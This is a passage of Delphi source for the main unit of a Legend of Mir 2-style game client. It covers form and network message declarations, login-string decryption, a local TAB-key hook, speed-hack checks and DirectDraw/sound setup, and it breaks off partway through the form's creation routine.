Unit ClMain;

Interface

Uses
  Windows, Messages, SysUtils, StrUtils, Classes, Graphics, Controls, Forms,
  Dialogs, mmsystem, JSocket, ExtCtrls, DXDraws, DirectX, DXClass, DrawScrn,
  IntroScn, PlayScn, MapUnit, WIL, Grobal2, SDK, Actor, DIB, StdCtrls, CliUtil,
  HUtil32, EdCode, DWinCtl, ClFunc, magiceff, SoundUtil, DXSounds, clEvent,Wave,
  IniFiles, Spin, ComCtrls,{Mpeg,} MShare, Share,ImageHlp,FrmWg, WShare, ShellApi,
  Registry, WMPLib_TLB, Itmap, RSA,RzButton, OleCtrls{ SHDocVw_EWB, EwbCore};

Const
  BO_FOR_TEST = FALSE;
  EnglishVersion = True; //TRUE;
  BoNeedPatch = TRUE;

  NEARESTPALETTEINDEXFILE = 'Data\npal.idx';

  //MonImageDir = '.\Graphics\Monster\';
//   NpcImageDir = '.\Graphics\Npc\';
//  ItemImageDir = '.\Graphics\Items\';
//   WeaponImageDir = '.\Graphics\Weapon\';
//   HumImageDir = '.\Graphics\Human\';

Type
  TKornetWorld = Record
    CPIPcode: String;
    SVCcode: String;
    LoginID: String;
    CheckSum: String;
  End;

  TOneClickMode = (toNone, toKornetWorld);

  TfrmMain = Class(TDxForm)
    CSocket: TClientSocket;
    Timer1: TTimer;
    MouseTimer: TTimer;
    WaitMsgTimer: TTimer;
    SelChrWaitTimer: TTimer;
    CmdTimer: TTimer;
    MinTimer: TTimer;
    SpeedHackTimer: TTimer;
    DXDraw: TDXDraw;
    WindowsMediaPlayer1: TWindowsMediaPlayer;
    WgTimer: TTimer;
    ClientSocket: TClientSocket;
    Login: TRSA;
    Client: TRSA;
    Server: TRSA;
    Timer2: TTimer;

    Procedure DXDrawInitialize(Sender: TObject);
    Procedure FormCreate(Sender: TObject);
    Procedure FormDestroy(Sender: TObject);
    Procedure FormKeyDown(Sender: TObject; Var Key: Word;
      Shift: TShiftState);
    Procedure DXDrawMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    Procedure DXDrawMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    Procedure FormKeyPress(Sender: TObject; Var Key: Char);
    Procedure DXDrawFinalize(Sender: TObject);
    Procedure CSocketConnect(Sender: TObject; Socket: TCustomWinSocket);
    Procedure CSocketDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    Procedure CSocketError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; Var ErrorCode: Integer);
    Procedure CSocketRead(Sender: TObject; Socket: TCustomWinSocket);
    Procedure Timer1Timer(Sender: TObject);
    Procedure DXDrawMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    Procedure MouseTimerTimer(Sender: TObject);
    Procedure FormClose(Sender: TObject; Var Action: TCloseAction);
    Procedure DXDrawDblClick(Sender: TObject);
    Procedure WaitMsgTimerTimer(Sender: TObject);
    Procedure SelChrWaitTimerTimer(Sender: TObject);
    Procedure DXDrawClick(Sender: TObject);
    Procedure CmdTimerTimer(Sender: TObject);
    Procedure MinTimerTimer(Sender: TObject);
    Procedure CheckHackTimerTimer(Sender: TObject);
    Procedure SendTimeTimerTimer(Sender: TObject);
    Procedure SpeedHackTimerTimer(Sender: TObject);
    Procedure WindowsMediaPlayer1PlayStateChange(ASender: TObject;
      NewState: Integer);
    Procedure WgTimerTimer(Sender: TObject);
    Procedure ClientSocketConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    Procedure ClientSocketDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    Procedure ClientSocketRead(Sender: TObject; Socket: TCustomWinSocket);
    Procedure Timer2Timer(Sender: TObject);
    Procedure FormShow(Sender: TObject);
    procedure FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);

  Private
    SocStr, BufferStr: String;
    WarningLevel: Integer;
    TimerCmd: TTimerCommand;
    MakeNewId: String;

    ActionLockTime: LongWord;
    LastHitTick: LongWord;
    ActionFailLock: Boolean;
    ActionFailLockTime: LongWord;
    FailAction, FailDir: integer;
    ActionKey, ActionKeyEx: word;

    TimerID: THandle;

    //    CursorSurface: TDirectDrawSurface;
    mousedowntime: longword;
    WaitingMsg: TDefaultMessage;
    WaitingStr: String;
    WhisperName: String;
    m_Point: TPoint;
    m_nClientRunTime: LongWord;
    //    OldSendId:Integer;

    Procedure AutoPickUpItem(boFlag: Boolean = False);
    procedure GetAutoMovingXY();
    Procedure ProcessKeyMessages;
    Procedure ProcessActionMessages;
    Procedure CheckSpeedHack(rtime: Longword);
    Procedure DecodeMessagePacket(datablock: String);
    Procedure ActionFailed;
    Function GetMagicByKey(Key: char): PTClientMagic;
    Procedure UseMagicSpell(who, effnum, targetx, targety, magic_id: integer);
    Procedure UseMagicFire(who, efftype, effnum, targetx, targety, target:
      integer);
    Procedure UseMagicFireFail(who: integer);
    Procedure CloseAllWindows;
    Procedure ClearDropItems;
    Procedure ResetGameVariables;
    Procedure ChangeServerClearGameVariables;
    Procedure AttackTarget(target: TActor);

    Function CheckDoorAction(dx, dy: integer): Boolean;
    Procedure ClientGetPasswdSuccess(body: String);
    Procedure ClientGetNeedUpdateAccount(body: String);
    Procedure ClientGetSelectServer;
    Procedure ClientGetPasswordOK(Msg: TDefaultMessage; sBody: String);
    Procedure ClientGetReceiveChrs(body: String);
    Procedure ClientGetStartPlay(body: String);
    Procedure ClientGetReconnect(body: String);
    Procedure ClientGetServerConfig(Msg: TDefaultMessage; sBody: String);
    Procedure ClientGetMapDescription(Msg: TDefaultMessage; sBody: String);
    Procedure ClientGetGameGoldName(Msg: TDefaultMessage; sBody: String);
    Procedure ClientGetPlayDrink(Msg: TDefaultMessage; sBody: String);

    Procedure ClientGetAdjustBonus(bonus: integer; body: String);
    Procedure ClientGetAddItem(body: String;bShow:Byte=0);
    Procedure ClientGetHeroAddItem(body: String;bShow:Byte=0);
    Procedure ClientGetUpdateItem(body: String);
    Procedure ClientGetDelItem(body: String);
    Procedure ClientGetHeroDelItem(body: String);
    Procedure ClientGetDelItems(body: String);
    Procedure ClientGetBagItmes(body: String);
    Procedure ClientGetBoxsItmes(body: String);
    Procedure ClientGetBoxsItmes2(body: String);
    Procedure ClientTakeOnItem(ItemIdx: Integer; where: Byte; boHero: Boolean;
      body: String);
    Procedure ClientTakeOffItem(ItemIdx: Integer; where: Byte; body: String);
    Procedure ClientGetShopItmes(Actor: TActor; body: String);
    Procedure ClientGetSelfShopItmes(body: String);
    Procedure ClientGetTaxisList(nIdx, nNowPage, nMaxPage: integer; body:
      String);
    Procedure ClientGetSellList(nIdx, nNowPage, nMaxPage, nFind: Integer; body:
      String);
    Procedure ClientGetHeroBagItmes(body: String);
    Procedure ClientGetHeroBagCount(Size: Integer);
    Procedure ClientGetDropItemFail(iname: String; sindex: integer);
    Procedure ClientGetHeroDropItemFail(iname: String; sindex: integer);
    Procedure ClientGetDiamondGird(Diamond, Gird: integer);
    Procedure ClientGetShowItem(itemid, x, y, looks: integer; itmname: String);
    Procedure ClientGetHideItem(itemid, x, y: integer);
    Procedure ClientGetSenduseItems(body: String);
    Procedure ClientGetSendHeroItems(body: String);
    //    procedure ClientGetSendAddUseItems (body: string);
    Procedure ClientGetAddMagic(body: String);
    Procedure ClientGetDelMagic(magid: integer);
    procedure ClientChangeMagic(Magid:Integer;body:string);
    procedure ClientHeroChangeMagic(Magid:Integer;body:string);
    Procedure ClientGetHeroAddMagic(body: String);
    Procedure ClientGetHeroDelMagic(magid: integer);
    Procedure ClientGetBooks(id: integer);
    Procedure ClientGetMyMagics(body: String);
    Procedure ClientGetHeroMagics(body: String);
    Procedure ClientGetMagicLvExp(magid, maglv, magtrain: integer);
    Procedure ClientGetCloseHero();
    Procedure ClientGetHeroMagicLvExp(magid, maglv, magtrain: integer);
    Procedure ClientGetBabDuraChange(Idx, Dura, MaxDura: integer);
    Procedure ClientGetBabInfoChange(Idx, Dura, MaxDura: integer; body: String);
    Procedure ClientGetHeroBabDuraChange(Idx, Dura, MaxDura: integer);
    Procedure ClientGetDuraChange(uidx, newdura, newduramax: integer);
    Procedure ClientGetHeroDuraChange(uidx, newdura, newduramax: integer);
    Procedure ClientGetMerchantSay(merchant, face: integer; saying: String);
    Procedure ClientGetSendGoodsList(merchant, count: integer; body: String);
    Procedure ClientGetSendMakeDrugList(merchant: integer; body: String);
    Procedure ClientGetSendUserSell(merchant: integer; nCls: Word);
    Procedure ClientGetSendUserRepair(merchant: integer);
    Procedure ClientGetSendUserStorage(merchant: integer);
    Procedure ClientGetSendPlayDrink(merchant: integer);
    Procedure ClientGetSaveItemList(merchant: integer; bodystr: String);
    Procedure ClientGetSaveItemList2(merchant: integer; bodystr: String);
    Procedure ClientGetSendDetailGoodsList(merchant, count, topline: integer;
      bodystr: String);
    Procedure ClientGetSendNotice(body: String);
    Procedure ClientGetGroupMembers(bodystr: String);
    Procedure ClientGetOpenGuildDlg(bodystr: String);
    Procedure ClientGetSendGuildMemberList(body: String);
    Procedure ClientGetDealRemoteAddItem(body: String);
    Procedure ClientGetDealRemoteDelItem(body: String);
    Procedure ClientGetChallenegAddItem(body: String;nidx:Integer);
    procedure ClientGetChallengeDelItem(body: String;nidx:Integer);
    Procedure ClientGetReadMiniMap(mapindex, mapindex2: integer);
    Procedure ClientGetChangeGuildName(body: String);
    Procedure ClientGetSendUserState(body: String);
    Procedure DrawEffectHum(nType, nX, nY: Integer);
    Procedure ClientGetNeedPassword(Body: String);
    Procedure ClientGetPasswordStatus(Msg: pTDefaultMessage; Body: String);
    Procedure ClientGetRegInfo(Msg: pTDefaultMessage; Body: String);
    Procedure ClientShopList(Body: String);
    Procedure ClientGetRenewHum(Msg: pTDefaultMessage; Body: String);
    Procedure ClientGetMoveHMShow(Actor: TActor; Param, Tag: Word);
    Procedure ClientGetMonMoveHMShow(Actor: TActor; Param, nTag: Word; boDis:
      Boolean);
    Procedure ClientGetLevelItms(nCode: Integer; body: String);
    Procedure ClientGetCheckData(body: String);
    Procedure ClientGetCheckConnect(port: Integer; body: String);
    Procedure ClientGetAddress(port: Integer; body: String);
    Procedure _DXDrawMouseDown(Sender: TObject; Button: TMouseButton; Shift:
      TShiftState; X, Y: Integer);

    Procedure SetInputStatus();
    Procedure CmdShowHumanMsg(sParam1, sParam2, sParam3, sParam4,
      sParam5: String);
    Procedure ShowHumanMsg(Msg: pTDefaultMessage);
    Procedure SendPowerBlock;

  Public
    LoginId, LoginPasswd: String;
    Certification: integer;
    ActionLock: Boolean;
    //MainSurface: TDirectDrawSurface;
    NpcImageList: TList;
    ItemImageList: TList;
    DnItemImageList: TList;
    BagItemImageList: TList;
    MMapImageList: TList;
    WeaponImageList: TList;
    HumImageList: TList;
    m_dwHeroEatTick: LongWord;
    m_CheckTick: LongWord;
    Procedure UseMagic(tx, ty: integer; pcm: PTClientMagic; boFlag: Boolean =
      False);
    Procedure WMSysCommand(Var Message: TWMSysCommand); Message WM_SYSCOMMAND;
    Procedure ProcOnIdle;
    Procedure AppOnIdle(Sender: TObject; Var Done: Boolean);
    Procedure AppLogout;
    Procedure AppExit;
    Procedure PrintScreenNow;
    Procedure EatItem(idx: integer);
    Procedure EatOpenItem(idx: integer);
    Procedure OpenEatItem(idx: integer; sIteName: String);
    Procedure HeroEatItem(idx: integer);
    Procedure WMMove(Var Message: TWMMove); Message WM_MOVE;
    procedure MyMessage(var MsgData:TMessage);message WM_USER+1003;

    Procedure SendClientMessage(msg, Recog, param, tag, series: integer);
    Procedure SendLogin(uid, passwd: String);
    Procedure SendNewAccount(ue: TUserEntry; ua: TUserEntryAdd);
    Procedure SendUpdateAccount(ue: TUserEntry; ua: TUserEntryAdd);
    Procedure SendSelectServer(svname: String);
    Procedure SendChgPw(id, passwd, newpasswd: String);
    Procedure SendNewChr(uid, uname, shair, sjob, ssex: String);
    Procedure SendQueryChr;
    Procedure SendDelChr(chrname: String);
    Procedure SendSelChr(chrname: String);
    Procedure SendRunLogin;
    Procedure SendSay(str: String);
    Procedure SendActMsg(ident, x, y, dir: integer);
    Procedure SendSpellMsg(ident, x, y, dir, target: integer);
    Procedure SendQueryUserName(targetid, x, y: integer);
    Procedure SendDropItem(name: String; itemserverindex: integer);
    Procedure SendPickup;
    Procedure SendTakeOnItem(where: byte; itmindex: integer; itmname: String);
    Procedure SendTakeOffItem(where: byte; itmindex: integer; itmname: String);
    Procedure SendEat(itmindex: integer; itmname: String);
    Procedure SendButchAnimal(x, y, dir, actorid: integer);
    Procedure SendMagicKeyChange(magid: integer; keych: char; bohero: Boolean =
      false);
    Procedure SendMerchantDlgSelect(merchant: integer; rstr: String);
    Procedure SendPlayDrinkGame(Npc, Idx: integer);
    Procedure SendPlayDrinkSend(Npc, Idx, Count: integer);
    Procedure SendQueryPrice(merchant, itemindex: integer; itemname: String);
    Procedure SendQueryRepairCost(merchant, itemindex: integer; itemname:
      String);
    Procedure SendSellItem(merchant, itemindex: integer; itemname: String);
    Procedure SendRepairItem(merchant, itemindex: integer; itemname: String);
    Procedure SendStorageItem(merchant, itemindex: integer; itemname: String);
    Procedure SendSellOffItem(merchant, itemindex, ItemPic: integer; boFlag:
      Boolean);
    Procedure SendPlayDrinkItem(merchant, itemindex: Integer);
    Procedure SendShopItems(sTitle: String);
    Procedure SendSelfShopBuy(ActorIdx, nX, nY, sItemidx: Integer);
    procedure SendMakeWine();
    procedure SendADDChallengeItem(cl:TClientItem;idx:Word);
    procedure SendDelChallengeItem(cl:TClientItem;idx:Word);
    procedure SendCancelChallege();
    Procedure SendCloseShopItems();
    Procedure SendGetDetailItem(merchant, menuindex: integer; itemname: String);
    Procedure SendBuyItem(merchant, itemserverindex: integer; itemname: String);
    Procedure SendTakeBackStorageItem(merchant, itemserverindex: integer;
      itemname: String);
    Procedure SendMakeDrugItem(merchant: integer; itemname: String);
    Procedure SendDropGold(dropgold: integer);
    Procedure SendGroupMode(onoff: Boolean);
    Procedure SendCreateGroup(withwho: String; boAuto: Boolean);
    Procedure SendAutoGroup(boAuto: Boolean);
    Procedure SendAutoAddGroup(sName: String);
    Procedure SendWantMiniMap;
    Procedure SendDealTry; //交易
    procedure SendChallengeTry;
    Procedure SendGuildDlg;
    Procedure SendCancelDeal;
    Procedure SendAddDealItem(ci: TClientItem);
    Procedure SendDelDealItem(ci: TClientItem);
    Procedure SendChangeDealGold(gold: integer);//更改交易金币
    procedure SendChangeChallengeGold(gold: integer);//更改挑战抵押金币
    procedure SendChangeChallengeGameDiamond(gold: integer);//更改挑战抵押金刚石
    Procedure SendDealEnd;
    procedure SendChallengeEnd;//确认挑战抵押
    Procedure SendAddGroupMember(withwho: String);
    Procedure SendDelGroupMember(withwho: String);
    Procedure SendGuildHome;
    Procedure SendGuildMemberList;
    Procedure SendGuildAddMem(who: String);
    Procedure SendGuildDelMem(who: String);
    Procedure SendGuildUpdateNotice(notices: String; nClass: Byte);
    Procedure SendGuildUpdateGrade(rankinfo: String);
    Procedure SendSpeedHackUser;
    //SpeedHaker 荤侩磊甫 辑滚俊 烹焊茄促.
    Procedure SendAdjustBonus(remain: integer; babil: TNakedAbility);
    Procedure SendPassword(sPassword: String; nIdent: Integer);
    Procedure SendShopList(nIdent: Integer);
    Procedure SendShopBuy(sItemName: String);
    Procedure SendShopSend(sItemName, UserName: String);
    Procedure SendGetHero(HeroClass: Integer);
    Procedure SendPlayDrink(Drink1, Drink2: Integer);
    Procedure SendShopLingfu(nCount: Integer);
    Procedure SendShopPay();
    Procedure SendHeroCall();
    Procedure SendHeroFun(nOff, btClass: Word);
    Procedure SendHeroMinHPTail(Hp:Integer);
    Procedure SendHeroMob();
    Procedure SendHeroItemToMasterBag(nIdx: Integer; sMsg: String);
    Procedure SendMasterItemToHeroBag(nIdx: Integer; sMsg: String);
    Procedure SendHeroTakeOnItem(where: byte; itmindex: integer; itmname:
      String);
    Procedure SendHeroIncFireDrakeHeartDander(itmindex: integer);
    Procedure SendItemFold(Sourindex,Desindex:Integer;bHero:Byte);
    Procedure SendHeroTakeOffItem(where: byte; itmindex: integer; itmname:
      String);
    Procedure SendHeroEat(itmindex: integer; itmname: String);
    Procedure SendHeroWatch(boWatch: Boolean);
    Procedure SendHeroDropItem(name: String; itemserverindex: integer);
    Procedure SendHeroAllowJoint();
    Procedure SendViewDelHum();
    Procedure SendRenewHum(sName: String);
    Procedure SendLevelItem(Idx, bijouIdx, bijou2Idx: integer);
    Procedure SendOpenArk(ArkIdx, KeyIdx: integer);
    Procedure SendOpenMove();
    Procedure SendOpenGetItem();
    Procedure SendTaxis(nIdx, nJob, nPage: Integer);
    Procedure SendSellOffGetList(nIdx, nPage, nFind: Integer; sMsg: String);
    Procedure SendSellOffBuy(nItemIndex: Integer);

    Function TargetInSwordLongAttackRange(ndir: integer; nRate: Integer = 2):
      Boolean;
    Function TargetInSwordWideAttackRange(ndir: integer): Boolean;
    Function TargetInSwordCrsAttackRange(ndir: integer): Boolean;
    Procedure OnProgramException(Sender: TObject; E: Exception);
    Procedure SendSocket(sendstr: String);
    Function ServerAcceptNextAction: Boolean;
    Function CanNextAction: Boolean;
    Function CanNextHit: Boolean;
    Function IsUnLockAction(action, adir: integer): Boolean;
    Procedure ActiveCmdTimer(cmd: TTimerCommand);
    Function IsGroupMember(uname: String): Boolean;
    Procedure SelectChr(sChrName: String);

    //function  GetNpcImg(wAppr: Word; var WMImage: TWMImages): Boolean;
    Function GetWStateImg(Idx: Integer): TDirectDrawSurface; Overload;
    Function GetWDnItemImg(Idx: Integer): TDirectDrawSurface;
    Function GetWMMapImg(Idx: Integer): TDirectDrawSurface;
    Function GetWBagItemImg(Idx: Integer): TDirectDrawSurface; Overload;
    Function GetWBagItemImg(Idx: Integer; Var ax, ay: integer):
      TDirectDrawSurface; Overload;
    Function GetWStateImg(Idx: Integer; Var ax, ay: integer):
      TDirectDrawSurface;
      Overload;
    Function GetWWeaponImg(Weapon, m_btSex, nFrame: Integer; Var ax, ay:
      integer): TDirectDrawSurface;
    Function GetWHumImg(Dress, m_btSex, nFrame: Integer; Var ax, ay: integer):
      TDirectDrawSurface;
    Function GetWHorseHumImg(Dress, m_btSex, nFrame: Integer; Var ax, ay:
      integer): TDirectDrawSurface;
    Function GetWHorseImg(Horse, nFrame: Integer; Var ax, ay: integer):
      TDirectDrawSurface;
    Procedure ProcessCommand(sData: String);

  End;
Function IsDebug(): Boolean;
Function IsDebugA(): Boolean;
//  function  CheckMirProgram: Boolean;
Procedure PomiTextOut(dsurface: TDirectDrawSurface; x, y: integer; str: String);
Procedure WaitAndPass(msec: longword);
Function GetRGB(c256: byte): LongWord;
Procedure DebugOutStr(msg: String);
Procedure Test();
Procedure Test2();

Procedure TimeProc(uTimerID, uMessage: UINT;
  dwUser, dw1, dw2: DWORD) Stdcall;
//  Function  ClearWg(nHandle:THandle;myIdx:Integer):Bool;stdcall;
//  Function  ClearWg2(nHandle:THandle;myIdx:Integer):Bool;stdcall;

Var
  nLeft: integer = 10;
  nTop: integer = 10;
  nWidth: integer;
  nHeight: integer;
  g_boShowMemoLog: Boolean = False;
  g_boShowRecog: Integer = 0;
  frmMain: TfrmMain;
  DScreen: TDrawScreen;
  IntroScene: TIntroScene;
  LoginScene: TLoginScene;
  SelectChrScene: TSelectChrScene;
  PlayScene: TPlayScene;
  LoginNoticeScene: TLoginNotice;
  //  m_TitleList      :TStringList;
  //  m_ProcessList    :TStringList;
  //  m_boLogin        :Boolean;
  //  m_boEnd          :Boolean;
  Frequency, OldCounter: Int64;

  LocalLanguage: TImeMode = imSHanguel;

  //MP3              :TMPEG;
  TestServerAddr: String = '127.0.0.1';
  //  BGMusicList      :TStringList;
    //DObjList: TList;  //官蹿俊 函版等 瘤屈狼 钎泅
  EventMan: TClEventManager;
  KornetWorld: TKornetWorld;
  Map: TMap;
  BoOneClick: Boolean;
  OneClickMode: TOneClickMode;
  m_boPasswordIntputStatus: Boolean = False;

Implementation

Uses
  FState, DlgConfig, DES, MD5Unit, ReadInteger,FindMapPath,FrmWeb;

{$R *.DFM}
Var
  ShowMsgActor: TActor;

  (*function  CheckMirProgram: Boolean;
  var
     pstr, cstr: array[0..255] of char;
     mirapphandle: HWnd;
  begin
  Try //程序自动增加
     Result := FALSE;
     StrPCopy (pstr, 'legend of mir2');
     mirapphandle := FindWindow (nil, pstr);
     if (mirapphandle <> 0) and (mirapphandle <> Application.Handle) then begin
  {$IFNDEF COMPILE}
        SetActiveWindow(mirapphandle);
        Result := TRUE;
  {$ENDIF}
        exit;
     end;
  Except //程序自动增加
    DebugOutStr('[Exception] UnClMain.CheckMirProgram:'); //程序自动增加
  End; //程序自动增加
  end;  *)

Procedure PomiTextOut(dsurface: TDirectDrawSurface; x, y: integer; str: String);
Var
  i, n: integer;
  d: TDirectDrawSurface;
Begin
  Try //程序自动增加
    For i := 1 To Length(str) Do
    Begin
      n := byte(str[i]) - byte('0');
      If n In [0..9] Then
      Begin //箭磊父 凳
        d := g_WMainImages.Images[30 + n];
        If d <> Nil Then
          dsurface.Draw(x + i * 8, y, d.ClientRect, d, TRUE);
      End
      Else
      Begin
        If str[i] = '-' Then
        Begin
          d := g_WMainImages.Images[40];
          If d <> Nil Then
            dsurface.Draw(x + i * 8, y, d.ClientRect, d, TRUE);
        End;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] UnClMain.PomiTextOut'); //程序自动增加
  End; //程序自动增加
End;

Procedure WaitAndPass(msec: longword);
Var
  start: longword;
Begin
  Try //程序自动增加
    start := GetTickCount;
    While GetTickCount - start < msec Do
    Begin
      Application.ProcessMessages;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] UnClMain.WaitAndPass'); //程序自动增加
  End; //程序自动增加
End;

Function GetRGB(c256: byte): LongWord;
Begin
  With frmMain.DxDraw Do
    Result := RGB(DefColorTable[c256].rgbRed,
      DefColorTable[c256].rgbGreen,
      DefColorTable[c256].rgbBlue);
End;

Procedure DebugOutStr(msg: String);
Var
  flname: String;
  fhandle: TextFile;
Begin
  Try //程序自动增加
    //DScreen.AddChatBoardString(msg,clWhite, clBlack);
    exit;
    flname := '.\!Jdebug.txt';
    If FileExists(flname) Then
    Begin
      AssignFile(fhandle, flname);
      Append(fhandle);
    End
    Else
    Begin
      AssignFile(fhandle, flname);
      Rewrite(fhandle);
    End;
    WriteLn(fhandle, DateTimeToStr(Now) + ' ' + msg);
    CloseFile(fhandle);
  Except //程序自动增加
    DebugOutStr('[Exception] UnClMain.DebugOutStr'); //程序自动增加
  End; //程序自动增加
End;

Function KeyboardHookProc(Code: Integer; WParam:WParam;lparam:LPARAM):Longint; Stdcall;
Begin
 if Code<0 then
   Result := CallNextHookEx(g_ToolMenuHook,Code,WParam,lparam)
else
begin
  if (WParam = 9) and ((lParam and $80000000)= 0) and (g_MySelf <> Nil){g_boSendLogin} then
     SendMessage(FrmMain.Handle,WM_USER+1003,0,0)
     //非登陆窗口按TAB键就发送地图切换消息并吃掉TAB键不知道为什么不吃掉会收到三次按键消息
   else
    Result := CallNextHookEx(g_ToolMenuHook,Code,WParam,lparam);
end;
 (*
  Result := 0; //jacky
  if ((WParam = 9) { or (WParam = 13)}) and (g_nLastHookKey = 18) and (GetTickCount - g_dwLastHookKeyTime < 500) then begin
    if FrmMain.WindowState <> wsMinimized then begin
      FrmMain.WindowState := wsMinimized;
    end else
      Result := CallNextHookEx(g_ToolMenuHook, Code, WParam, Longint(@Msg));
    exit;
  end;
  g_nLastHookKey := WParam;
  g_dwLastHookKeyTime := GetTickCount;

  Result := CallNextHookEx(g_ToolMenuHook, Code, WParam, Longint(@Msg));
  *)
End;

Procedure Test();
Begin
End;

Procedure Test2();
Begin

End;

Procedure TfrmMain.FormCreate(Sender: TObject);
Var
  flname {, str}: String;
  ini: TIniFile;
  // FtpConf:TIniFile;
  I: integer;
  sLoginStr, sTemp: String;
  dwThreadID: LongWord;
Begin
  Try //程序自动增加
    //CreateHook();
  //  ini := nil;
  //  FtpConf := nil;
    //DebugOutStr(sLoginStr);
    //FormWgMain.Show;
  //  m_TitleList      :=TStringList.Create;
  //  m_ProcessList    :=TStringList.Create;
    m_nClientRunTime := GetTickCount;
    g_nMiniMapIndex := -1;
    m_dwHeroEatTick := GetTickCount;
    g_CheckVerTime := GetTickCount + 60 * 1000;
    g_AutoPickupList := TList.Create;
    //g_ShowItemList   :=TGList.Create;
    g_MyFriendList := TStringList.Create;
    g_MyBlacklist := TStringList.Create;
    m_CheckTick := GetTickCount;
    g_WgHintList := TStringList.Create;
    {end else begin //0x0048B999
      m_nFileHandle:=FileCreate(m_sDBFileName);
      if m_nFileHandle > 0 then begin
        FillChar(m_Header,SizeOf(TDBHeader),#0);
        m_Header.sDesc:= sDBHeaderDesc;
        m_Header.nHumCount:=0;
        m_Header.n6C:=0;
        FileWrite(m_nFileHandle,m_Header,SizeOf(TDBHeader));
      end;
    end;}
    g_DWinMan := TDWinManager.Create(Self);
    g_DXDraw := DXDraw;
    Randomize;
    g_FIleName := application.ExeName;
    sLoginStr := ParamStr(1);
    Try
{$IF TOOLVER     = VERDEMO}
      sLoginStr := DecryStrHex(sLoginStr, 'HAO0');
{$IFEND}
{$IF TOOLVER     = BLUEVER}
      sLoginStr := DecryStrHex(sLoginStr, 'Setup');
{$IFEND}
{$IF TOOLVER     = MONEYVER}
      Login.CommonalityMode := Server.DecryptStr(RSAMODEKEY);
      Login.PrivateKey := Server.DecryptStr(PRIVATEKEY);
      sLoginStr := Login.DecryptStr(sLoginStr);
{$IFEND}
    Except
      sLoginStr := '';
    End;
    ini := TIniFile.Create('.\Mir2.ini');
    Try
      If sLoginStr = '' Then
      Begin
{$IF TOOLVER = DEFVER}

        g_sCurFontName := ini.ReadString('Setup', 'FontName', g_sCurFontName);
        g_sServerAddr := ini.ReadString('Setup', 'ServerAddr', g_sServerAddr);
        g_nServerPort := ini.ReadInteger('Setup', 'ServerPort', g_nServerPort);
        g_sLogoText := ini.ReadString('Server', 'Server1Caption', g_sLogoText);
        g_boFullScreen := ini.ReadBool('Setup', 'FullScreen', g_boFullScreen);
        g_nLoginHandle := 3608170;
{$ELSE}
        exit;
{$IFEND}
      End
      Else
      Begin
        //g_boFullScreen := ini.ReadBool   ('Setup', 'FullScreen', g_boFullScreen);
        sLoginStr := GetValidStr3(sLoginStr, g_sCurFontName, [#13]);
        sLoginStr := GetValidStr3(sLoginStr, g_sLogoText, [#13]);
        If g_sLogoText <> '' Then
        Begin
          sLoginStr := GetValidStr3(sLoginStr, g_sServerAddr, [#13]);
          sLoginStr := GetValidStr3(sLoginStr, sTemp, [#13]);
          g_nServerPort := Str_ToInt(sTemp, g_nServerPort);
{$IF WINDOFILL   = OPENFILL}
          sLoginStr := GetValidStr3(sLoginStr, sTemp, [#13]);
          g_boFullScreen := (sTemp <> '1');
          sLoginStr := GetValidStr3(sLoginStr, sTemp, [#13]);
          g_nLoginHandle := Str_ToInt(sTemp, 0);
{$IFEND}

        End
        Else
          exit;
      End;
    Finally
      ini.Free;
    End;
{$IF WINDOFILL   = OPENFILL}
    If g_boFullScreen Then
    Begin
      DXDraw.Options := DXDraw.Options + [doFullScreen];
    End
    Else
    Begin
      frmMain.BorderStyle := bsSingle;
      Width := SCREENWIDTH;
      Height := SCREENHEIGHT;
      g_boNoDarkness := TRUE;
      g_boUseDIBSurface := True;
      //g_boUseDIBSurface := TRUE;
      If DXDraw.ClientWidth < SCREENWIDTH Then
        Width := Width + (SCREENWIDTH - DXDraw.ClientWidth);
      If DXDraw.ClientHeight < SCREENHEIGHT Then
        Height := Height + (SCREENHEIGHT - DXDraw.ClientHeight);
    End;
{$ELSE}
    DXDraw.Options := DXDraw.Options + [doFullScreen];
{$IFEND}

    Caption := g_sLogoText;
    //if g_boFullScreen then

    LoadWMImagesLib(Nil);
    NpcImageList := TList.Create;
    ItemImageList := TList.Create;
    MMapImageList := TList.Create;
    DnItemImageList := TList.Create;
    BagItemImageList := TList.Create;
    WeaponImageList := TList.Create;
    HumImageList := TList.Create;
    g_DXSound := TDXSound.Create(Self);
    g_DXSound.Initialize;
    {g_WindName:=Login.DecryptStr(g_WindName);
    g_iniName:=Login.DecryptStr(g_iniName);
    g_Mir2Class:=Login.DecryptStr(g_Mir2Class);
    g_FileClass:=Login.DecryptStr(g_FileClass);
    g_Mir2Sur:=Login.DecryptStr(g_Mir2Sur); }
    For i := Low(g_MyMagic) To High(g_MyMagic) Do
      g_MyMagic[I] := Nil;
    //FillChar(g_MyMagic,SizeOf(g_MyMagic),#0);

    DXDraw.Display.Width := SCREENWIDTH;
    DXDraw.Display.Height := SCREENHEIGHT;
    //
    If g_DXSound.Initialized Then
    Begin
      g_Sound := TSoundEngine.Create(g_DXSound.DSound);
      //MP3:=TMPEG.Create(nil);
    End
    Else
    Begin
      g_Sound := Nil;
      //MP3:=nil;
    End;

    g_ToolMenuHook := SetWindowsHookEx(WH_KEYBOARD,@KeyboardHookProc,0,GetCurrentThreadID);
    g_SoundList := TStringList.Create;
    //   BGMusicList:=TStringList.Create;

    flname := '.\wav\sound.lst';
    LoadSoundList(flname);
    //   flname := '.\wav\sound2.lst';
    //   LoadBGMusicList(flname);
       //if FileExists (flname) then
       //   SoundList.LoadFromFile (flname);
    try
      g_WgHintList.LoadFromFile('.\Data\explain2.dat');
    except
      g_WgHintList.Add('您客户端里Data\explain2.dat文件损坏了,请更新一下!');
    end;
    DScreen := TDrawScreen.Create;
    IntroScene := TIntroScene.Create;
    LoginScene := TLoginScene.Create;
    SelectChrScene := TSelectChrScene.Create;
    PlayScene := TPlayScene.Create;
    LoginNoticeScene := TLoginNotice.Create;

    Map := TMap.Create;
    g_nMiniMapPath := nil;
    g_LegendMap := nil;

    g_DropedItemList := TList.Create;
